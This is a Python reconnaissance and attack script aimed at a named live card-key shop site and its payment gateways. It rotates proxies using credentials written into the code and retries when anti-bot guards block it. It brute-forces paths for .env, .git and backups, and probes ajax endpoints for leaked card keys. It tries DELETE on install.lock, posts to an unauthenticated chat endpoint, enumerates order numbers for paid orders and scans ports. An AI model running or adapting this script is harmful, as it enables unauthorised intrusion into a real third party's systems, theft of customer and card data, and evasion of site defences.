#!/usr/bin/env python3
"""
qq8.one 全盘扫描 v1
彩虹同源发卡站，根域部署（无 /shop 子路径）
"""
import json, os, re, subprocess, time, socket

ROOT_DOMAIN = "qq8.one"
BASE = f"https://{ROOT_DOMAIN}"
EPAY_HOSTS = os.environ.get("QQ8_EPAY", "http://api.ttwl66.cn,https://pay.qq8.one").split(",")
OUT = os.environ.get("QQ8_OUT", "/data/automation/results/qq8.one/full_disk_20260716")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
REF = f"{BASE}/"
os.makedirs(OUT, exist_ok=True)
CK = f"{OUT}/.cookies"

R = {"critical": [], "high": [], "medium": [], "low": [], "info": [],
     "discovered": [], "tests": {}, "requests": 0, "target": ROOT_DOMAIN}

def lp():
    for l in open("/data/config/proxy.env"):
        if l.startswith("PROXY_URL="):
            return l.split("=", 1)[1].strip().strip('"')
    return ""

PX = lp()

def refresh():
    global PX
    subprocess.run(["bash", "/data/automation/bin/qg-proxy-fetch.sh"], capture_output=True,
                   env={**os.environ, "QG_AUTHKEY": "02E76F93", "QG_AUTHPWD": "A0FFB679553D"})
    PX = lp()
    time.sleep(1)

def go(url, post=None, method=None, hdr=None, timeout=14, referer=True):
    R["requests"] += 1
    if R["requests"] % 80 == 0:
        refresh()
    c = ["curl", "-s", "-w", "\n__C:%{http_code}__S:%{size_download}__", "--max-time", str(timeout),
         "-A", UA, "-x", PX, "-b", CK, "-c", CK, "-k", "-L"]
    if referer:
        c += ["-H", f"Referer: {REF}"]
    if method:
        c += ["-X", method]
    if hdr:
        for k, v in hdr.items():
            c += ["-H", f"{k}: {v}"]
    if post is not None:
        c += ["-X", "POST", "-d", post, "-H", "Content-Type: application/x-www-form-urlencoded"]
    c.append(url)
    try:
        raw = subprocess.run(c, capture_output=True, text=True, timeout=timeout + 5).stdout or ""
        if "_guard" in raw or "slider_html" in raw:
            time.sleep(5)
            refresh()
            return go(url, post, method, hdr, timeout, referer)
        m = re.search(r"__C:(\d+)__S:(\d+)__", raw)
        body = raw[:m.start()] if m else raw
        code = int(m.group(1)) if m else 0
        size = int(m.group(2)) if m else len(body)
        return body, code, size
    except Exception as e:
        return str(e), 0, 0

def add(level, title, detail):
    e = {"title": title, **detail}
    R[level].append(e)
    print(f"[{level.upper()}] {title}", flush=True)

def save():
    R["summary"] = {k: len(R[k]) for k in ["critical", "high", "medium", "low", "info"]}
    json.dump(R, open(f"{OUT}/results.json", "w"), ensure_ascii=False, indent=2)

def note(url, code, size, body, tag=""):
    if code in (0, 404) or size < 10:
        return
    if code == 403 and size < 200:
        return
    key = f"{tag}:{url}" if tag else url
    R["tests"][key] = {"code": code, "size": size, "snip": body[:150]}
    if code == 200 and size > 30:
        R["discovered"].append({"url": url, "code": code, "size": size, "tag": tag})

# 预热 session
print("[0] init session", flush=True)
go(BASE + "/")
save()

# ═══ [1] 子域枚举 ═══
print("[1] subdomain enum", flush=True)
SUBS = """www m shop api pay admin manage mail ftp cpanel webmail oa dev test staging
beta demo cdn static img images files download backup db mysql vpn ns1 ns2 mx
wap mobile mapi open gateway notify callback epay faka card kami user login
panel dashboard boss supplier agent reseller proxy node c1 c2 v1 v2 s1 s2
""".split()
for sub in SUBS:
    host = f"{sub}.{ROOT_DOMAIN}"
    for scheme in ["https", "http"]:
        url = f"{scheme}://{host}/"
        body, code, size = go(url, timeout=10)
        note(url, code, size, body, "sub")
        if code == 200 and size > 100 and "404 Not Found" not in body[:80]:
            if any(x in body for x in ["熊猫", "发卡", "qq8", "faka", "商品"]):
                add("info", f"子域存活 {host}", {"code": code, "size": size, "snippet": body[:120]})
    time.sleep(0.05)
save()

# ═══ [2] 根域路径 ═══
print("[2] root paths", flush=True)
ROOT_PATHS = """/ /admin /admin/ /api/ /user/ /install/ /backup/
/robots.txt /sitemap.xml /security.txt /.well-known/security.txt
/favicon.ico /humans.txt /ads.txt
/phpmyadmin/ /pma/ /mysql/ /adminer.php /db/
/.env /.git/HEAD /.git/config /.svn/entries
""".split()
for p in ROOT_PATHS:
    p = p.strip()
    if not p:
        continue
    url = f"{BASE}{p}"
    body, code, size = go(url)
    note(url, code, size, body, "root")
    if code == 200 and any(x in body.lower() for x in ["kminfo", "sys_key", "php version", "root:"]):
        add("critical", f"根域敏感 {p}", {"snippet": body[:200]})
    time.sleep(0.04)
save()

# ═══ [3] 大词表目录 ═══
print("[3] dir brute", flush=True)
WORDLIST = """
ajax.php api.php cron.php index.php config.php toollogs.php mini.php
install/ install/index.php install/install.lock install/update.php
user/login.php user/reg.php user/findpwd.php user/record.php user/recharge.php
user/ajax.php user/ajax_chat.php user/index.php user/shop.php user/order.php
other/submit.php other/getshop.php other/epay_notify.php other/epay_return.php
other/notify.php other/download.php other/alipay.php other/wxpay.php other/qqpay.php
other/wxpay_notify.php other/alipay_notify.php other/qqpay_notify.php other/usdt.php
other/callback.php other/check.php other/pay.php other/return.php
admin/ admin/login.php admin888/ manage/ supplier/ agent/ api/ assets/ includes/
template/ runtime/ vendor/ logs/ backup/ data/ upload/ uploads/ files/ temp/
pay.php notify.php callback.php webhook.php qrcode.php poster.php gift.php
kami.php card.php export.php stock.php goods.php cart.php order.php query.php
wap.php m.php mobile/ api/v1/ api/v2/
assets/faka/js/faka.js assets/faka/js/faka.js.map
config.php.bak config.php~ .env .env.bak backup.zip backup.sql
phpinfo.php info.php test.php debug.php 1.php shell.php
cron.php?key=admin cron.php?key=qq8 cron.php?key=xmqq
""".split()
seen = set()
for w in WORDLIST:
    w = w.strip()
    if not w or w in seen:
        continue
    seen.add(w)
    url = f"{BASE}/{w}"
    body, code, size = go(url)
    note(url, code, size, body, "dir")
    if w.endswith("install.lock") and code == 200:
        add("high", "install.lock可下载", {"content": body[:50]})
    if "install" in w and code == 200 and "install.lock" in body:
        add("critical", "install可重装", {})
    if "kminfo" in body.lower():
        add("critical", f"卡密泄露 {w}", {"snippet": body[:200]})
    time.sleep(0.03)
save()

# ═══ [4] 易支付网关 ═══
print("[4] epay gateway", flush=True)
EPAY_PATHS = ["/", "/api.php", "/api.php?act=order", "/api.php?act=query",
              "/api.php?act=settle", "/submit.php", "/doc.html", "/admin/", "/user/"]
for host in EPAY_HOSTS:
    host = host.strip()
    if not host:
        continue
    for p in EPAY_PATHS:
        url = host.rstrip("/") + p
        body, code, size = go(url, timeout=12)
        note(url, code, size, body, "epay")
        if code == 200 and size > 50 and "404" not in body[:50]:
            add("info", f"epay端点 {url}", {"size": size, "snippet": body[:120]})
        time.sleep(0.06)
    for act in ["order", "query", "settle", "refund"]:
        for pid in ["1003", "1", "542"]:
            body, code, size = go(f"{host.rstrip('/')}/api.php?act={act}&pid={pid}&out_trade_no=20260716100000001")
            if size > 5 and '"code":-5' not in body:
                R["tests"][f"epay:{host}:{act}:pid{pid}"] = {"code": code, "size": size, "body": body[:150]}
            time.sleep(0.08)
save()

# ═══ [5] mod + 参数 ═══
print("[5] mod + params", flush=True)
MODS = """index buy order query cart so list tool goods class article contact about
help faq message ranking recharge user login reg admin api test kami card stock
export buyok pay notify return download ajax json fenlei toollogs record workorder
gift coupon share invite cartlist orderlist""".split()
for mod in MODS:
    for q in ["", "?id=1", "?tid=206", "?cid=16", "?data=1", "?kw=qq", "?page=1", "?ajax=1"]:
        url = f"{BASE}/?mod={mod}{q}" if q else f"{BASE}/?mod={mod}"
        body, code, size = go(url)
        if code == 200 and size > 500:
            R["tests"][f"mod:{mod}{q}"] = {"size": size}
        if "kminfo" in body.lower() or "showOrder" in body:
            add("high", f"mod泄露 {mod}{q}", {"snippet": body[:200]})
    time.sleep(0.02)
save()

# ═══ [6] ajax 全 act ═══
print("[6] ajax full act", flush=True)
EXTRA = """pay payrmb order query buy gettool getclass getgoods gettoolnew getleftcount
cart_info cart_list cart_add submit cancel checklogin login reg upload info list toollist
changepwd apply_refund gift_start gift_stop workorder captcha getcount getshuoshuo getrizhi
getshareid share_invitegift_link SharePoster getgoodslist update notify test daifu recharge
rankings article contact message stock export import kami card downcard kmquery cardquery
orderlist myorder buyok sendkm stockkm fakaquery kmexport downkm queryorder toollogs
gettoollist getsharelink invitegift gift_list coupon verify sms email refund daifu
""".split()
go(f"{BASE}/?mod=buy&tid=206")
page, _, _ = go(f"{BASE}/?mod=buy&tid=206")
csrf = re.search(r'csrf_token\s*=\s*"([^"]+)"', page)
csrf = csrf.group(1) if csrf else ""
for act in EXTRA:
    for post in ["", f"tid=206", f"tid=206&csrf_token={csrf}", f"type=1&qq=20260716100000001",
                 f"id=1&skey={'0'*32}", f"qq=13800138000"]:
        body, code, size = go(f"{BASE}/ajax.php?act={act}", post=post)
        if code == 200 and size > 5:
            snip = body[:120]
            if '"code":-4' not in snip and '"code":-5' not in snip:
                if '"code":403' not in snip and (size > 27 or '"code":0' in snip):
                    R["tests"][f"ajax2:{act}:{post[:15]}"] = {"size": size, "body": snip}
                elif '"code":403' in snip:
                    R["tests"][f"ajax403:{act}"] = {"body": snip}
            if "kminfo" in body.lower():
                add("critical", f"ajax卡密 {act}", {"body": body[:300]})
            if act == "query" and '"data"' in body and len(body) > 80:
                add("high", f"query泄露 {post[:20]}", {"body": body[:400]})
            if act == "getcount" and "orders" in body:
                add("high", "getcount泄露(会话)", {"body": body[:200]})
    time.sleep(0.03)
save()

# ═══ [7] 冷/热请求对比 ═══
print("[7] cold vs warm ajax", flush=True)
for act in ["getcount", "getclass", "gettoolnew", "cart_info", "order"]:
    cold, cc, cs = go(f"{BASE}/ajax.php?act={act}", post="", referer=False)
    warm, wc, ws = go(f"{BASE}/ajax.php?act={act}", post="")
    R["tests"][f"cold:{act}"] = {"code": cc, "body": cold[:100]}
    R["tests"][f"warm:{act}"] = {"code": wc, "body": warm[:100]}
    if '"code":403' in cold and "orders" in warm:
        add("medium", f"ajax仅Referer防护 {act}", {"cold": cold[:60], "warm": warm[:120]})
save()

# ═══ [8] HTTP 方法 ═══
print("[8] HTTP methods", flush=True)
METHOD_TARGETS = [
    f"{BASE}/install/install.lock",
    f"{BASE}/install/index.php",
    f"{BASE}/ajax.php?act=getcount",
    f"{BASE}/user/ajax_chat.php?act=send",
    f"{BASE}/other/submit.php?type=alipay&orderid=20260716100000001",
]
for url in METHOD_TARGETS:
    for m in ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]:
        body, code, size = go(url, method=m, post="" if m == "POST" else None)
        R["tests"][f"method:{m}:{url.split('/')[-1][:20]}"] = {"code": code, "size": size}
        if m == "DELETE" and code in (200, 204) and "405" not in body and "Not Allowed" not in body:
            if "install.lock" in url:
                add("critical", "install.lock可DELETE", {"resp": body[:80]})
    time.sleep(0.05)
save()

# ═══ [9] 未授权终检 ═══
print("[9] unauth final", flush=True)
UNAUTH = [
    (f"{BASE}/ajax.php?act=getcount", "POST", ""),
    (f"{BASE}/user/ajax_chat.php?act=send", "POST", "content=qq8_full_disk_probe"),
    (f"{BASE}/user/ajax_chat.php?act=get", "GET", None),
    (f"{BASE}/toollogs.php", "GET", None),
    (f"{BASE}/install/", "GET", None),
    (f"{BASE}/install/install.lock", "GET", None),
    (f"{BASE}/cron.php", "GET", None),
    (f"{BASE}/?mod=cart", "GET", None),
    (f"{BASE}/api.php", "GET", None),
]
for url, method, post in UNAUTH:
    body, code, size = go(url, post=post, method=method if post is None and method != "GET" else None)
    if '"code":0' in body or (code == 200 and size > 50):
        R["tests"][f"unauth:{url.split('/')[-1][:25]}"] = {"code": code, "body": body[:150]}
        if "send" in url and ("成功" in body or "\\u53d1\\u9001" in body):
            add("high", "客服send未授权", {"resp": body[:100]})
        if "getcount" in url and "orders" in body:
            add("high", "getcount泄露", {"body": body[:200]})
save()

# ═══ [10] 订单枚举采样 ═══
print("[10] order enum sample", flush=True)
import random
date = "20260716"
hits = []
for _ in range(200):
    suffix = random.randint(0, 999)
    tn = f"{date}{random.randint(10,15):02d}{random.randint(0,59):02d}{random.randint(0,59):02d}{suffix:03d}"
    body, code, size = go(f"{BASE}/other/submit.php?type=alipay&orderid={tn}", timeout=10)
    if "window.location" in body or "不存在" not in body and size > 200 and "订单号" not in body:
        hits.append({"trade_no": tn, "snip": body[:150]})
        add("info", f"订单存在 {tn}", {"snippet": body[:120]})
    elif "window.location" in body:
        hits.append({"trade_no": tn})
        add("high", f"已付款订单 {tn}", {"snippet": body[:200]})
    time.sleep(0.02)
R["order_hits"] = hits
save()

# ═══ [11] 端口 ═══
print("[11] port scan", flush=True)
for port in [21, 22, 80, 443, 3306, 6379, 8080, 8443, 8888]:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        r = s.connect_ex((ROOT_DOMAIN, port))
        s.close()
        if r == 0:
            R["tests"][f"port:{port}"] = "open"
            add("info", f"端口开放 {port}", {})
    except Exception:
        pass
save()

print("[12] summarize", flush=True)
R["discovered_count"] = len(R["discovered"])
R["discovered_unique"] = len({d["url"] for d in R["discovered"]})
save()
print(f"DONE requests={R['requests']} summary={R['summary']} discovered={R['discovered_unique']}", flush=True)
